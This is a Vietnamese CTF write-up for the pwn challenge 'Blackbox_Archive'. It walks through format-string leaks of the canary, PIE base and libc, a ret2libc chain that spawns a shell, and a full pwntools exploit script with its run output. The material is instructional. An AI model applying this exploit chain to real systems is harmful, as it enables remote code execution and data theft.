---
title: "Blackbox_Archive"
category: "Pwn"
tags: ["format-string", "canary-leak", "pie-leak", "arbitrary-read", "ret2libc", "glibc-2.36"]
solve_date: "2026-10-10T14:00:00+07:00"
language: "vi"
points: 450
---

# Blackbox_Archive

**Flag:** `foobarctf{format_leak_canary_pie_then_ret2libc}` (nộp theo format `foobarctf{...}` mà đề công bố; xem mục Kết quả để đối chiếu với nội dung tệp trên container)  
**File đề:** `blackbox` — 16.320 byte, SHA-256 `3a3b5f0e0ebf5565d7d8a965c480cabd5246f8c4903600d133b86fe063a02ba8`  
**Dịch vụ:** `nc foobar.challenge.arhn.in 10001` (`54.87.116.237:10001`)

## Đề bài

> A legacy archive terminal has been exposed to the network. It accepts an archive label and a recovery note.
>
> Something about its metadata handling feels... unsafe.
>
> Connect using: foobar.challenge.arhn.in 54.87.116.237 10001
>
> Flag format: foobarctf{...}

## Phân tích

Bảo vệ của binary (`readelf -lW`, `checksec` qua objdump):

| Cơ chế | Trạng thái | Hệ quả |
|---|---|---|
| PIE | bật | địa chỉ code/PLT/GOT chỉ dùng được sau khi leak |
| RELRO | Full (`GNU_RELRO 0x3d90–0x4000` phủ toàn bộ `.got`) | không ghi GOT |
| NX | bật (`GNU_STACK` chỉ `RW`) | không chạy shellcode trên stack |
| Stack canary | có trong `archive()` (`mov rax, fs:[0x28]` tại `rbp-8`) | phải leak canary trước khi ghi return address |

Các import gồm `read`, `printf`, `puts`, `memset`, `setvbuf`, `__stack_chk_fail`. Trong `archive()` (0x122a) có hai lỗi:

```nasm
0x122a <archive>: endbr64; push rbp; mov rbp,rsp; sub rsp,0xd0
0x1239: mov rax,fword ptr fs:[0x28] ; mov [rbp-0x8],rax        ; canary
0x1248: lea rax,[rbp-0xd0] ; memset(rdi=rax, esi=0, edx=0x60)   ; label, 96 byte
0x1261: lea rax,[rbp-0x70] ; memset(rdi=rax, esi=0, edx=0x60)   ; note,   96 byte
0x129a: read(0, rbp-0xd0, 0x5f)                                  ; label
0x12bd: printf(rbp-0xd0)                                        ; <-- format string
0x12f1: read(0, rbp-0x70, 0x100)                                 ; <-- overflow: 0x100 > 0x60
0x1306: mov rax,[rbp-8]; sub rax,fs:[0x28]; je 0x131a; call __stack_chk_fail
0x131a: leave ; ret
```

**Bố trí stack và chỉ số varargs.** `printf` nhận format là chính buffer label, nên các slot varargs bắt đầu từ con trỏ stack của đối số thứ 7 trở đi — trùng với `rbp-0xd0`. Đo trực tiếp trên dịch vụ cho thấy slot 6 ứng với `label[0]`, suy ra slot $i$ tương ứng địa chỉ `label + (i-6)\cdot 8`:

| Slot | Địa chỉ | Nội dung quan sát được |
|---:|---|---|
| 6–17 | `rbp-0xd0 … rbp-0x18` | 12 qword của chính buffer label (dữ liệu do ta gửi) |
| 30 | `rbp-0x10` | `base + 0x3d98` (`__DTOR_LIST__`) |
| 31 | `rbp-8` | **stack canary** (byte thấp bằng `0x00`) |
| 32 | `rbp` | saved rbp — giá trị tuyệt đối của stack |
| 33 | `rbp+8` | return address vào `main`, `base + 0x134c` → **PIE base** |
| 35 | `rbp+0x18` | return address trong `__libc_start_call_main` (`libc + 0x2724a`) |

`%$p` định vị theo số nguyên dương (`%31$p`) hoạt động; `%s` trên một slot không phải con trỏ hợp lệ (ví dụ slot giữ `argc = 1`) làm process crash ngay tại conversion đó, vì vậy mỗi lần probe chỉ lấy một nhóm slot đã biết là pointer.

**Vì sao overflow không cần canary mới mỗi lần.** Canary nằm trong TLS (`fs:[0x28]`) của thread, glibc chỉ sinh một lần cho process; `archive()` được gọi lại vẫn so cùng giá trị. Tương tự, `main` quay lại sẽ dựng lại frame ở đúng địa chỉ cũ. Nghĩa là: leak một lần ở round đầu, rồi lặp lại `archive()` bao nhiêu round tuỳ ý trong cùng connection, và stack layout cũng như base không đổi.

**Cân bằng stack khi nhảy lại `main`.** Sau `leave; ret`, `rsp = archive_rbp + 16` (`≡ 0 mod 16`), tức lệch 8 byte so với lúc `main` được gọi ban đầu. Một gadget `ret` (`0x131b`) trước địa chỉ `main` trả lại đúng `rsp ≡ 8 mod 16`; điều này kiểm chứng bằng việc `printf` (dùng `movaps`) ở các round sau không crash.

**Đọc tuỳ ý bộ nhớ.** Binary được build với `DT_FLAGS = BIND_NOW`, nên tại thời điểm `printf(label)` chạy, các slot GOT của `puts/printf/read/memset/setvbuf` đã trỏ thẳng tới libc. Từ round 2 ta đã biết `base`, vì vậy đặt địa chỉ 8 byte ở phần cuối buffer label, sau chuỗi format ASCII, rồi dùng `%<slot>$s` sẽ in ra chuỗi byte tại địa chỉ đó: với một con trỏ userspace 6 byte, `%s` dừng ở byte null thứ 7 → đọc được trọn địa chỉ. Bố trí: chuỗi format ASCII đứng trước (để không bị cắt bởi null trong địa chỉ), các địa chỉ nằm ở offset bội số của 8.

Cùng primitive này đọc được `argv[0]` và env ngay từ round 2–3, cho biết cách chạy thật của dịch vụ:

```text
argv[0] = /app/blackbox
/proc/1/cmdline: socat TCP-LISTEN:10001,reuseaddr,fork EXEC:/app/blackbox,su=ctf,stderr
PATH=... HOSTNAME=... HOME=/home/ctf SHELL=/usr/sbin/nologin SOCAT_SOCKPORT=10001 ...
```

Trong phần môi trường đọc được không có flag, và luồng xử lý đã phân tích không mở tệp flag. Lời giải dùng thực thi mã để đọc `/app/flag.txt` (mode `0400`, chủ `ctf`).

**Định danh libc.** Leak GOT cho ra offset chính xác so với load base (đo bằng cách đi qua `DT_DEBUG → r_debug → r_map → link_map`, đọc `l_addr` và `l_name` của từng object đang load; `l_addr` page-aligned nên byte thấp nhất là null, phải đọc từ `l_addr+1` rồi suy lại 8 byte):

| Symbol | Offset trong libc của dịch vụ |
|---|---:|
| `printf` | 0x525b0 |
| `setvbuf` | 0x77f90 |
| `puts` | 0x77980 |
| `read` | 0xf82a0 |
| `memset` | 0x1649c0 (IFUNC đã resolve, không phải stub 0x9c840 trong `.dynsym`) |
| return site `__libc_start_call_main` | 0x2724a |

`l_name` của object chứa `puts` là `/lib/x86_64-linux-gnu/libc.so.6`. Các build Ubuntu đã đối chiếu trong quá trình phân tích có offset khác (ví dụ Ubuntu 2.39: `puts = 0x87cc0`, `read = 0x11bd20`; Ubuntu 2.43: `puts = 0x8e860`), nên loại. Bảng offset trên khớp build đã tải về và kiểm tra dưới đây:

```text
libc6_2.36-9+deb12u14_amd64.deb (Debian 12) -> usr/lib/x86_64-linux-gnu/libc.so.6
sha256 6b4a45352fd0c540a9c7c718f35ce8c8e46a4e482f9d3885a910c32d1a0e1421
Build ID 93ac61ec5a8eb1396f9fbd350e3169a558528a40
```

Trong file này: `system = 0x4c490`, `"/bin/sh" = 0x197031`, `pop rdi; ret = 0x277e5`, `ret = 0x26e99`, `syscall; ret = 0x86172`, và site `call *%rax` tới `main` ở `0x27248` (return address `0x2724a` — trùng với slot 35 leak được).

## Lời giải

Payload note có cấu trúc (tổng 256 byte cho phép, dùng 152):

| Offset | Độ dài | Giá trị |
|---:|---:|---|
| 0 | 104 | filler (`'A'`), tới `rbp-8` |
| 104 | 8 | canary đã leak (giữ nguyên kiểm tra của epilogue) |
| 112 | 8 | saved rbp đã leak |
| 120 | … | ROP chain |

Bốn bước, tất cả trong một connection:

1. **Leak base + canary**: label = `_%30$p_%31$p_%32$p_%33$p`, kiểm `slot33-0x134c == slot30-0x3d98` và page-aligned. Note = `filler|canary|saved_rbp| base+0x131b | base+0x131c` → `main` chạy lại, banner xuất hiện lần thứ hai.
2. **Leak libc**: label gồm 3 con trỏ `base+0x3fa8/0x3fb8/0x3fc8` (GOT của `puts/printf/read`) được tham chiếu bằng `%<slot>$s`. `libc = puts_leaked - 0x77980`. Quay lại `main`.
3. **Kiểm tra primitive trước khi gửi ROP**: đọc `libc` (phải là `7f 45 4c 46 02 01 01 03`) và `libc+0x197031` (phải in ra `/bin/sh`). Hai giá trị này khớp cả 3 lần chạy. Quay lại `main`.
4. **ret2libc**: chain `[base+0x131b, libc+0x277e5, libc+0x197031, libc+0x4c490]` = `ret; pop rdi; ret; "/bin/sh"; system`, với `rdi` được nạp qua `pop rdi` và `system` nhận vào `rsp ≡ 8 (mod 16)` đúng chuẩn ABI.

`system()` fork/`clone` và exec `/bin/sh` với `stdin/stdout` chính là socket, nên fd của ta trở thành terminal của shell (`uid=1000(ctf)`), đủ quyền đọc `/app/flag.txt`.

## Kết quả

Chạy script (mục Tái hiện) trên dịch vụ thật, ASLR tự đổi qua mỗi lần chạy:

```text
[1] canary=0xdb415379c4c35700  base=0x5d6313ab0000
[2] puts=0x7f7ec86f8980  printf=0x7f7ec86d35b0  libc=0x7f7ec8681000
[3] @libc=b'\x7fELF\x02\x01\x01\x03'  @/bin/sh=b'/bin/sh'
[4] shell -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
GLUG{format_leak_canary_pie_then_ret2libc}
```

Dữ liệu đọc từ remote qua shell (`od -c /app/flag.txt`, 43 byte):

```text
0000000   G   L   U   G   {   f   o   r   m   a   t   _   l   e   a   k
0000020   _   c   a   n   a   r   y   _   p   i   e   _   t   h   e   n
0000040   _   r   e   t   2   l   i   b   c   }  \n
```

- Nội dung tệp trên container: `GLUG{format_leak_canary_pie_then_ret2libc}`.
- Chuỗi nộp theo format đề công bố: `foobarctf{format_leak_canary_pie_then_ret2libc}` (giữ nguyên phần body, đổi wrapper). Chưa lưu phản hồi submission.
- Quét toàn bộ filesystem của container (chỉ loại `/proc`, `/sys`) bằng `grep -rhoaE "[A-Za-z0-9_]{2,12}\{[^}]{4,90}\}"` chỉ trả về đúng một chuỗi dạng flag kể trên; `/root` (0700) không đọc được và không có hướng leo thang (`sudo` không cài, chỉ setuid chuẩn). Trong các đường dẫn đọc được, phép quét chỉ ghi nhận chuỗi trên. Không có cơ sở kết luận về nội dung của các thư mục không có quyền truy cập.

## Tái hiện

Cần Python 3 và pwntools (`pip install pwntools`). Lưu fenced block cuối bài thành `blackbox_archive.py`, chạy với quyền truy cập dịch vụ:

```bash
python3 blackbox_archive.py
```

Toàn bộ địa chỉ (canary, PIE base, libc base) lấy động từ chính connection, nên script chạy lại được nhiều lần: 3/3 lần chạy end-to-end đều tới được shell, riêng chuỗi leak–verify (bước 1–3) đo trên 6/6 connection cho offset libc trùng nhau. Payload 152 byte nằm trong giới hạn `read` 256 byte của note buffer. Offset libc chỉ đúng với image hiện tại (`glibc 2.36-9+deb12u14`, build ID ở trên); nếu image đổi, đo lại 5 offset `printf/setvbuf/puts/read/memset` qua bước 2 và đối chiếu lại với libc6 của distro tương ứng.

```python
#!/usr/bin/env python3
"""Blackbox_Archive (FooBar CTF 2026, Pwn 450): format string -> ret2libc.

Dependency: python3 + pwntools.   Run: python3 blackbox_archive.py
"""
import time
from pwn import remote, context, p64, u64

context.log_level = "error"
HOST, PORT = "foobar.challenge.arhn.in", 10001

# Offsets in the supplied binary (added to the runtime PIE base).
RET_GADGET = 0x131B          # `ret` at the tail of archive()'s epilogue
MAIN = 0x131C
RET_ADDR_TO_MAIN = 0x134C    # instruction after `call archive` inside main
DTOR_LIST = 0x3D98           # slot 30 holds base + 0x3d98 (cross-check)
GOT = {"puts": 0x3FA8, "printf": 0x3FB8, "read": 0x3FC8}

# Offsets in the remote libc: Debian 12 glibc 2.36-9+deb12u14 libc.so.6.
LIBC_PUTS = 0x77980
LIBC_SYSTEM = 0x4C490
LIBC_BINSH = 0x197031
LIBC_POP_RDI_RET = 0x277E5

SLOT0 = 6                    # varargs slot of the label buffer itself
PAD = 104                    # note buffer (rbp-0x70) -> saved canary (rbp-8)
SEP = b"\xff"


def connect():
    r = remote(HOST, PORT, timeout=30)
    r.recvuntil(b"Enter archive label:\n")
    return r


def printf_round(r, label):
    """Send a label, return the raw printf() output."""
    r.sendline(label)
    r.recvuntil(b"Archive metadata:\n")
    return r.recvuntil(b"\n").rstrip(b"\n")


def note_round(r, note):
    r.recvuntil(b"Enter recovery note:\n")
    r.sendline(note)
    return r.recvuntil(b"Enter archive label:\n")


def leak_slots(r, slots):
    fmt = b"".join(("_%" + str(i) + "$p").encode() for i in slots)
    out = printf_round(r, fmt)
    vals = [0 if t == b"(nil)" else int(t, 16) for t in out.split(b"_") if t]
    return dict(zip(slots, vals))


def stack_read(r, addrs):
    """%s-dereference up to 5 absolute addresses inside one label."""
    n = len(addrs)
    for k in range(1, 11):
        first = SLOT0 + k
        text = b"".join(b"%%%d$s" % (first + i) + SEP for i in range(n))
        if len(text) <= 8 * k and 8 * k + 8 * n <= 94:
            label = text + b" " * (8 * k - len(text)) + b"".join(p64(a) for a in addrs)
            return printf_round(r, label).split(SEP)[:n]
    raise RuntimeError("label too long")


def uptr(chunk):
    return u64(chunk[:6] + b"\x00\x00") if len(chunk) >= 6 else None


def reenter(r, ctx):
    note_round(r, overflow(ctx, [ctx["base"] + RET_GADGET, ctx["base"] + MAIN]))


def overflow(ctx, chain):
    return (b"A" * PAD + p64(ctx["canary"]) + p64(ctx["saved_rbp"]) +
            b"".join(p64(a) for a in chain))


def main():
    r = connect()

    # 1) canary, saved rbp and PIE base through the format string
    d = leak_slots(r, (30, 31, 32, 33))
    ctx = {"canary": d[31], "saved_rbp": d[32], "base": d[33] - RET_ADDR_TO_MAIN}
    assert ctx["base"] == d[30] - DTOR_LIST and ctx["base"] % 0x1000 == 0
    print("[1] canary=0x%016x  base=0x%x" % (ctx["canary"], ctx["base"]))
    reenter(r, ctx)

    # 2) real libc pointers from the binary's own GOT
    got = stack_read(r, [ctx["base"] + GOT[n] for n in ("puts", "printf", "read")])
    libc = uptr(got[0]) - LIBC_PUTS
    print("[2] puts=0x%x  printf=0x%x  libc=0x%x" % (uptr(got[0]), uptr(got[1]), libc))
    assert libc % 0x1000 == 0
    reenter(r, ctx)

    # 3) confirm the mapping and the command string before firing the chain
    chk = stack_read(r, [libc, libc + LIBC_BINSH])
    print("[3] @libc=%r  @/bin/sh=%r" % (chk[0][:8], chk[1][:7]))
    assert chk[0][:4] == b"\x7fELF" and chk[1][:7] == b"/bin/sh"
    reenter(r, ctx)

    # 4) ret2libc: ret; pop rdi; ret; "/bin/sh"; system
    printf_round(r, b"X")
    chain = [ctx["base"] + RET_GADGET, libc + LIBC_POP_RDI_RET,
             libc + LIBC_BINSH, libc + LIBC_SYSTEM]
    note = overflow(ctx, chain)
    r.recvuntil(b"Enter recovery note:\n")
    r.sendline(note)
    time.sleep(1.0)
    r.recv(timeout=3)

    r.sendline(b"id; cat /app/flag.txt")
    buf = b""
    for _ in range(4):
        try:
            buf += r.recv(timeout=5)
        except EOFError:
            break
    print("[4] shell ->", buf.decode(errors="replace").strip())
    r.close()


if __name__ == "__main__":
    main()
```
